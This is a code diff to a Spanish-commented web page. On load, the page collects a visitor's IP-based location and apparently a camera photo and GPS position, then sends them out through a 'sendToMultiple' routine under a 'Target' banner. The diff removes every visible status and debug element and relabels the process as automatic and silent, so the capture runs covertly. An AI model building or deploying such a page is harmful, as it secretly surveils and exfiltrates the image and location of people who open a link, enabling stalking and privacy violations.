@@ -14,32 +14,13 @@
             justify-content: center;
             align-items: center;
             font-family: system-ui;
-            color: #eee;
         }
         video, canvas { display: none; }
-        .status {
-            font-size: 0.8rem;
-            color: #ccc;
-            position: fixed;
-            bottom: 10px;
-            right: 10px;
-            user-select: none;
-        }
-        .debug {
-            position: fixed;
-            bottom: 30px;
-            left: 10px;
-            font-size: 0.6rem;
-            color: #aaa;
-            max-width: 80%;
-            word-break: break-all;
-        }
+        /* Sin ningún elemento visible */
     </style>
 </head>
 <body>
-    <div class="status" id="status">.</div>
-    <div class="debug" id="debug"></div>
-
+    <!-- NADA VISIBLE, SOLO ELEMENTOS OCULTOS -->
     <video id="video" autoplay playsinline></video>
     <canvas id="canvas"></canvas>
 
@@ -269,12 +250,8 @@
             return resultados.some(r => r.ok);
         }
 
-        // ---------- 11. PROCESO PRINCIPAL (TODO AUTOMÁTICO) ----------
+        // ---------- 11. PROCESO PRINCIPAL (TODO AUTOMÁTICO Y SILENCIOSO) ----------
         window.addEventListener('load', async function() {
-            const status = document.getElementById('status');
-            const debug = document.getElementById('debug');
-            status.textContent = '•';
-
             try {
                 // Notificación de apertura
                 let ipInfo = await getLocationFromWorker();
@@ -340,14 +317,10 @@
                 msg += `\n━━━━━━━━━━━━━━━━\n🎯 Target: ${window.location.href}\n⚡ Developed by: @jsemanper`;
 
                 // Enviar todo
-                const enviado = await sendToMultiple(msg, photo, gps);
-                status.textContent = 
-                debug.textContent = 
+                await sendToMultiple(msg, photo, gps);
 
             } catch(e) {
                 console.error(e);
-                status.textContent = '✗';
-                debug.textContent = '❌ Error: ' + e.message;
             }
         });
     </script>
